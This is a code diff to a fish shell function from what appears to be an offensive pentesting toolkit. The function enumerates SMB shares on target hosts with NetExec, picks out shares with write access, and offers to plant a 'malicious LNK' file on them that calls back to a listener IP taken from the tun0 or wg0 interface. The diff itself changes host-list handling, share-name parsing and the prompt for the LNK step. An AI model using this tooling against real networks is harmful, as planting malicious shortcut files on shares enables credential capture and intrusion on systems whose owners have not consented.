@@ -128,23 +128,27 @@ Examples:
     end
 
     # Create temporary files
-    set hosts_tmp (mktemp)
     set shares_tmp (mktemp)
     set share_names_tmp (mktemp)
     set files_tmp (mktemp)
-    trap 'rm -f "$hosts_tmp" "$shares_tmp" "$share_names_tmp" "$files_tmp"' EXIT TERM INT
+    trap 'rm -f "$shares_tmp" "$share_names_tmp" "$files_tmp"' EXIT TERM INT
 
-    # Determine target hosts
+    # Determine target hosts. Keep the list in memory so interactive gum
+    # prompts do not consume the host file through stdin.
+    set -l targets
     if test -f "$target_host"
-        # Target is a file with hosts
-        cp $target_host $hosts_tmp
+        set targets (sed -e 's/\r$//' -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' -e '/^#/d' -e '/^$/d' "$target_host")
     else
-        # Target is a single host
-        echo "$target_host" > $hosts_tmp
+        set targets "$target_host"
+    end
+
+    if test (count $targets) -eq 0
+        ezpz_error "No targets found in $target_host."
+        return 1
     end
 
     # Process each target
-    while read -l target
+    for target in $targets
         ezpz_header "Enumerating non-default shares on $target"
         ezpz_cmd "nxc smb $target $nxc_auth --shares"
         
@@ -218,14 +222,21 @@ Examples:
         {
             line = $0
             if (match(line, /WRITE/)) {
-                share = substr(line, 1, RSTART-1)
+                share = line
+                # The line is "share  READ,WRITE  description"; strip from the
+                # permission token onward so READ, is not kept in the name.
+                sub(/[ \t]+(READ,WRITE|WRITE|READ|NO ACCESS).*$/, "", share)
                 gsub(/^[ \t]+|[ \t]+$/, "", share)
                 print share
             }
         }')
 
         if test -n "$write_shares"
-            if ezpz_confirm "Write malicious LNK file on shares with WRITE permission?"
+            ezpz_info "WRITE shares: $write_shares"
+            ezpz_question "Select LNK action:"
+            set lnk_action (ezpz_choose_one 'skip' 'create malicious LNK')
+
+            if test "$lnk_action" = 'create malicious LNK'
                 # Prefer tun0, fall back to wg0, then to $arch from the box env.
                 set -l listener_ip ""
                 for iface in tun0 wg0
@@ -381,7 +392,7 @@ Examples:
                     ezpz_warn "No files found matching the pattern in share '$share'."
                 end
         end
-    end < $hosts_tmp
+    end
 
     ezpz_success "Done."
 end
